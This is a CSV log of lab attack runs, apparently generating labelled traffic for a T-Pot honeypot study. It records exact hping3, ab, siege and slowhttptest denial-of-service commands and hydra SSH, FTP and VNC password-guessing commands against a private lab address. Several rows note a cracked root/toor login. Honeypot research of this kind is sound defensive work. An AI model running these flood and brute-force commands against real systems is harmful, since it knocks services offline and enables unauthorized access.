run_id,attack_type_label,tool,exact_command,target_ip,target_port,start_time_utc,end_time_utc,expected_honeypot,src_ip_seen,notes
D012,denial_of_service,hping3,hping3 -F -P -U -p 80 -i u500 -c 20000 192.168.32.138,192.168.32.138,80,2026-07-24T09:42:39Z,2026-07-24T09:45:23Z,Suricata,192.168.32.1,XMAS flood :80 | flood+drain150s
D013,denial_of_service,hping3,hping3 -R -p 3306 -i u500 -c 20000 192.168.32.138,192.168.32.138,3306,2026-07-24T09:45:53Z,2026-07-24T09:48:36Z,Suricata,192.168.32.1,RST flood :3306 | flood+drain150s
D014,denial_of_service,hping3,hping3 --udp -p 5060 -d 100 -i u300 -c 30000 192.168.32.138,192.168.32.138,5060,2026-07-24T09:49:06Z,2026-07-24T09:50:04Z,Suricata/Honeytrap,192.168.32.1,UDP flood :5060 d100 | flood+drain45s
D015,denial_of_service,hping3,hping3 --udp -p 53 -d 512 -i u300 -c 30000 192.168.32.138,192.168.32.138,53,2026-07-24T09:50:34Z,2026-07-24T09:51:32Z,Suricata,192.168.32.1,UDP flood :53 d512 | flood+drain45s
D016,denial_of_service,hping3,hping3 --udp -p 1883 -d 64 -i u500 -c 20000 192.168.32.138,192.168.32.138,1883,2026-07-24T09:52:02Z,2026-07-24T09:53:00Z,Suricata/Honeytrap,192.168.32.1,UDP flood :1883 d64 | flood+drain45s
D017,denial_of_service,hping3,hping3 --udp -p 161 -d 256 -i u300 -c 30000 192.168.32.138,192.168.32.138,161,2026-07-24T09:53:30Z,2026-07-24T09:54:28Z,Suricata,192.168.32.1,UDP flood :161 d256 | flood+drain45s
D018,denial_of_service,hping3,hping3 --udp -p 123 -d 200 -i u300 -c 30000 192.168.32.138,192.168.32.138,123,2026-07-24T09:54:58Z,2026-07-24T09:55:56Z,Suricata,192.168.32.1,UDP flood :123 d200 | flood+drain45s
D019,denial_of_service,hping3,hping3 --udp -p 500 -d 300 -i u400 -c 25000 192.168.32.138,192.168.32.138,500,2026-07-24T09:56:26Z,2026-07-24T09:57:24Z,Suricata,192.168.32.1,UDP flood :500 d300 | flood+drain45s
D020,denial_of_service,ab,ab -t 30 -c 200 -s 30 http://192.168.32.138:80/,192.168.32.138,80,2026-07-24T09:57:54Z,2026-07-24T09:59:09Z,Snare/Tanner,192.168.32.1,HTTP GET flood ab :80 t30 c200 | flood+drain45s
D021,denial_of_service,ab,ab -t 30 -c 150 -s 30 http://192.168.32.138:8080/,192.168.32.138,8080,2026-07-24T09:59:39Z,2026-07-24T10:00:54Z,Wordpot,192.168.32.1,HTTP GET flood ab :8080 t30 | flood+drain45s
D022,denial_of_service,ab,ab -t 45 -c 300 -s 30 http://192.168.32.138:80/index.php,192.168.32.138,80,2026-07-24T10:01:24Z,2026-07-24T10:02:55Z,Snare/Tanner,192.168.32.1,HTTP GET flood ab :80 heavy | flood+drain45s
D023,denial_of_service,siege,siege -b -c 150 -t 30S http://192.168.32.138:80/,192.168.32.138,80,2026-07-24T10:03:25Z,2026-07-24T10:04:41Z,Snare/Tanner,192.168.32.1,HTTP flood siege :80 c150 | flood+drain45s
D024,denial_of_service,siege,siege -b -c 100 -t 30S http://192.168.32.138:8080/,192.168.32.138,8080,2026-07-24T10:05:11Z,2026-07-24T10:06:27Z,Wordpot,192.168.32.1,HTTP flood siege :8080 c100 | flood+drain45s
D025,denial_of_service,siege,siege -b -c 200 -t 40S http://192.168.32.138:80/?flood=1,192.168.32.138,80,2026-07-24T10:06:57Z,2026-07-24T10:08:23Z,Snare/Tanner,192.168.32.1,HTTP flood siege :80 param | flood+drain45s
D026,denial_of_service,slowhttptest,slowhttptest -c 1500 -H -i 10 -r 100 -t GET -u http://192.168.32.138:80/ -x 24 -p 3 -l 120,192.168.32.138,80,2026-07-24T10:08:53Z,2026-07-24T10:11:54Z,Snare/Tanner,192.168.32.1,slowloris :80 c1500 | flood+drain60s
D027,denial_of_service,slowhttptest,slowhttptest -c 1500 -B -i 10 -r 100 -t POST -u http://192.168.32.138:80/ -x 24 -p 3 -l 120,192.168.32.138,80,2026-07-24T10:12:24Z,2026-07-24T10:15:26Z,Snare/Tanner,192.168.32.1,slow-body :80 c1500 | flood+drain60s
D028,denial_of_service,slowhttptest,slowhttptest -c 1200 -X -r 80 -u http://192.168.32.138:80/ -l 120,192.168.32.138,80,2026-07-24T10:15:56Z,2026-07-24T10:18:57Z,Snare/Tanner,192.168.32.1,slow-read :80 c1200 | flood+drain60s
D029,denial_of_service,slowhttptest,slowhttptest -c 1500 -H -i 10 -r 100 -t GET -u http://192.168.32.138:8080/ -x 24 -p 3 -l 120,192.168.32.138,8080,2026-07-24T10:19:27Z,2026-07-24T10:22:29Z,Wordpot,192.168.32.1,slowloris :8080 c1500 | flood+drain60s
D030,denial_of_service,slowhttptest,slowhttptest -c 1500 -B -i 10 -r 100 -t POST -u http://192.168.32.138:8080/ -x 24 -p 3 -l 120,192.168.32.138,8080,2026-07-24T10:22:59Z,2026-07-24T10:26:00Z,Wordpot,192.168.32.1,slow-body :8080 c1500 | flood+drain60s
B001,online_guessing,hydra,hydra -I -t 4 -l root -P /mnt/c/tpot-project/03-scripts/wordlists/pw_tiny.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T19:47:55Z,2026-07-27T19:47:57Z,Cowrie,192.168.32.1,ssh root tiny | HIT x1: [22][ssh] host: 192.168.32.138   misc: (null)   login: root   password: toor
B002,online_guessing,hydra,hydra -I -t 4 -l root -P /mnt/c/tpot-project/03-scripts/wordlists/pw_common.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T19:48:57Z,2026-07-27T19:49:03Z,Cowrie,192.168.32.1,ssh root common | HIT x1: [22][ssh] host: 192.168.32.138   misc: (null)   login: root   password: toor
B003,online_guessing,hydra,hydra -I -t 4 -l root -P /mnt/c/tpot-project/03-scripts/wordlists/pw_ext.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T19:50:03Z,2026-07-27T19:50:07Z,Cowrie,192.168.32.1,ssh root ext | HIT x1: [22][ssh] host: 192.168.32.138   misc: (null)   login: root   password: toor
B004,online_guessing,hydra,hydra -I -t 4 -L /mnt/c/tpot-project/03-scripts/wordlists/users.txt -P /mnt/c/tpot-project/03-scripts/wordlists/pw_tiny.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T19:51:07Z,2026-07-27T19:51:28Z,Cowrie,192.168.32.1,ssh userlist tiny | HIT x1: [22][ssh] host: 192.168.32.138   misc: (null)   login: root   password: toor
B005,online_guessing,hydra,hydra -I -t 4 -L /mnt/c/tpot-project/03-scripts/wordlists/users.txt -P /mnt/c/tpot-project/03-scripts/wordlists/pw_common.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T19:52:28Z,2026-07-27T19:53:32Z,Cowrie,192.168.32.1,ssh userlist common | HIT x1: [22][ssh] host: 192.168.32.138   misc: (null)   login: root   password: toor
B006,online_guessing,hydra,hydra -I -t 4 -L /mnt/c/tpot-project/03-scripts/wordlists/users.txt -P /mnt/c/tpot-project/03-scripts/wordlists/pw_ext.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T19:54:32Z,2026-07-27T19:56:07Z,Cowrie,192.168.32.1,ssh userlist ext | HIT x1: [22][ssh] host: 192.168.32.138   misc: (null)   login: root   password: toor
B007,online_guessing,hydra,hydra -I -t 1 -l root -P /mnt/c/tpot-project/03-scripts/wordlists/pw_common.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T19:57:07Z,2026-07-27T19:57:31Z,Cowrie,192.168.32.1,ssh root common slow t1 | HIT x1: [22][ssh] host: 192.168.32.138   misc: (null)   login: root   password: toor
B008,online_guessing,hydra,hydra -I -t 8 -l root -P /mnt/c/tpot-project/03-scripts/wordlists/pw_ext.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T19:58:31Z,2026-07-27T19:58:34Z,Cowrie,192.168.32.1,ssh root ext fast t8 | HIT x1: [22][ssh] host: 192.168.32.138   misc: (null)   login: root   password: toor
B009,online_guessing,hydra,hydra -I -t 1 -L /mnt/c/tpot-project/03-scripts/wordlists/users.txt -P /mnt/c/tpot-project/03-scripts/wordlists/pw_tiny.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T19:59:34Z,2026-07-27T20:00:51Z,Cowrie,192.168.32.1,ssh userlist tiny slow | HIT x1: [22][ssh] host: 192.168.32.138   misc: (null)   login: root   password: toor
B010,online_guessing,hydra,hydra -I -t 8 -L /mnt/c/tpot-project/03-scripts/wordlists/users.txt -P /mnt/c/tpot-project/03-scripts/wordlists/pw_common.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T20:01:51Z,2026-07-27T20:02:26Z,Cowrie,192.168.32.1,ssh userlist common fast | HIT x1: [22][ssh] host: 192.168.32.138   misc: (null)   login: root   password: toor
B011,online_guessing,hydra,hydra -I -t 4 -l admin -P /mnt/c/tpot-project/03-scripts/wordlists/pw_common.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T20:03:26Z,2026-07-27T20:03:33Z,Cowrie,192.168.32.1,ssh admin common | HIT x1: 
B012,online_guessing,hydra,hydra -I -t 4 -l oracle -P /mnt/c/tpot-project/03-scripts/wordlists/pw_tiny.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T20:04:33Z,2026-07-27T20:04:36Z,Cowrie,192.168.32.1,ssh oracle tiny | HIT x1: 
B013,online_guessing,hydra,hydra -I -t 4 -W 1 -L /mnt/c/tpot-project/03-scripts/wordlists/users.txt -P /mnt/c/tpot-project/03-scripts/wordlists/pw_tiny.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T20:05:36Z,2026-07-27T20:06:15Z,Cowrie,192.168.32.1,ssh userlist tiny W1 | HIT x1: [22][ssh] host: 192.168.32.138   misc: (null)   login: root   password: toor
B014,online_guessing,hydra,hydra -I -t 2 -l root -P /mnt/c/tpot-project/03-scripts/wordlists/pw_tiny.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T20:07:15Z,2026-07-27T20:07:17Z,Cowrie,192.168.32.1,ssh root tiny t2 | HIT x1: [22][ssh] host: 192.168.32.138   misc: (null)   login: root   password: toor
B015,online_guessing,hydra,hydra -I -t 2 -l root -P /mnt/c/tpot-project/03-scripts/wordlists/pw_common.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T20:08:17Z,2026-07-27T20:08:30Z,Cowrie,192.168.32.1,ssh root common t2 | HIT x1: [22][ssh] host: 192.168.32.138   misc: (null)   login: root   password: toor
B016,online_guessing,hydra,hydra -I -t 2 -L /mnt/c/tpot-project/03-scripts/wordlists/users.txt -P /mnt/c/tpot-project/03-scripts/wordlists/pw_common.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T20:09:30Z,2026-07-27T20:11:36Z,Cowrie,192.168.32.1,ssh userlist common t2 | HIT x1: [22][ssh] host: 192.168.32.138   misc: (null)   login: root   password: toor
B017,online_guessing,hydra,hydra -I -t 4 -l ubuntu -P /mnt/c/tpot-project/03-scripts/wordlists/pw_common.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T20:12:36Z,2026-07-27T20:12:44Z,Cowrie,192.168.32.1,ssh ubuntu common | HIT x1: 
B018,online_guessing,hydra,hydra -I -t 4 -l root -P /mnt/c/tpot-project/03-scripts/wordlists/pw_ext.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T20:13:44Z,2026-07-27T20:13:48Z,Cowrie,192.168.32.1,ssh root ext repeat | HIT x1: [22][ssh] host: 192.168.32.138   misc: (null)   login: root   password: toor
B019,online_guessing,hydra,hydra -I -t 4 -L /mnt/c/tpot-project/03-scripts/wordlists/users.txt -P /mnt/c/tpot-project/03-scripts/wordlists/pw_tiny.txt ftp://192.168.32.138,192.168.32.138,21,2026-07-27T20:14:48Z,2026-07-27T20:14:54Z,Dionaea,192.168.32.1,ftp userlist tiny | no valid creds (expected for low-interaction / all-wrong)
B020,online_guessing,hydra,hydra -I -t 4 -l root -P /mnt/c/tpot-project/03-scripts/wordlists/pw_common.txt ftp://192.168.32.138,192.168.32.138,21,2026-07-27T20:15:54Z,2026-07-27T20:15:55Z,Dionaea,192.168.32.1,ftp root common | no valid creds (expected for low-interaction / all-wrong)
B021,online_guessing,hydra,hydra -I -t 4 -L /mnt/c/tpot-project/03-scripts/wordlists/users.txt -P /mnt/c/tpot-project/03-scripts/wordlists/pw_common.txt ftp://192.168.32.138,192.168.32.138,21,2026-07-27T20:16:55Z,2026-07-27T20:17:01Z,Dionaea,192.168.32.1,ftp userlist common | no valid creds (expected for low-interaction / all-wrong)
B022,online_guessing,hydra,hydra -I -t 4 -l root -P /mnt/c/tpot-project/03-scripts/wordlists/pw_recol_ssh.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T20:18:01Z,2026-07-27T20:18:17Z,Cowrie,192.168.32.1,ssh root recol t4 | HIT x1: [22][ssh] host: 192.168.32.138   misc: (null)   login: root   password: toor
B023,online_guessing,hydra,hydra -I -t 2 -l root -P /mnt/c/tpot-project/03-scripts/wordlists/pw_recol_ssh.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T20:19:17Z,2026-07-27T20:19:49Z,Cowrie,192.168.32.1,ssh root recol t2 | HIT x1: [22][ssh] host: 192.168.32.138   misc: (null)   login: root   password: toor
B024,online_guessing,hydra,hydra -I -t 8 -l root -P /mnt/c/tpot-project/03-scripts/wordlists/pw_recol_ssh.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T20:20:49Z,2026-07-27T20:20:58Z,Cowrie,192.168.32.1,ssh root recol t8 | HIT x1: [22][ssh] host: 192.168.32.138   misc: (null)   login: root   password: toor
B025,online_guessing,hydra,hydra -I -t 4 -P /mnt/c/tpot-project/03-scripts/wordlists/pw_tiny.txt vnc://192.168.32.138,192.168.32.138,5900,2026-07-27T20:21:58Z,2026-07-27T20:22:01Z,Heralding,192.168.32.1,vnc tiny (no user) | HIT x1: 
B026,online_guessing,hydra,hydra -I -t 4 -P /mnt/c/tpot-project/03-scripts/wordlists/pw_common.txt vnc://192.168.32.138,192.168.32.138,5900,2026-07-27T20:23:01Z,2026-07-27T20:23:07Z,Heralding,192.168.32.1,vnc common | HIT x1: 
B027,online_guessing,hydra,hydra -I -t 4 -l admin -P /mnt/c/tpot-project/03-scripts/wordlists/pw_recol_ssh.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T20:24:07Z,2026-07-27T20:24:23Z,Cowrie,192.168.32.1,ssh admin recol t4 (pure-fail) | HIT x1: 
B028,online_guessing,hydra,hydra -I -t 1 -L /mnt/c/tpot-project/03-scripts/wordlists/users.txt -P /mnt/c/tpot-project/03-scripts/wordlists/pw_recol_ssh.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T20:25:23Z,2026-07-27T20:35:50Z,Cowrie,192.168.32.1,ssh userlist recol t1 | HIT x1: [22][ssh] host: 192.168.32.138   misc: (null)   login: root   password: toor
B029,online_guessing,hydra,hydra -I -t 4 -L /mnt/c/tpot-project/03-scripts/wordlists/users.txt -P /mnt/c/tpot-project/03-scripts/wordlists/pw_recol_ssh.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T20:36:50Z,2026-07-27T20:39:22Z,Cowrie,192.168.32.1,ssh userlist recol t4 | HIT x1: [22][ssh] host: 192.168.32.138   misc: (null)   login: root   password: toor
B030,online_guessing,hydra,hydra -I -t 2 -l root -P /mnt/c/tpot-project/03-scripts/wordlists/pw_common.txt ssh://192.168.32.138,192.168.32.138,22,2026-07-27T20:40:22Z,2026-07-27T20:40:35Z,Cowrie,192.168.32.1,ssh root common-toor t2 | HIT x1: [22][ssh] host: 192.168.32.138   misc: (null)   login: root   password: toor
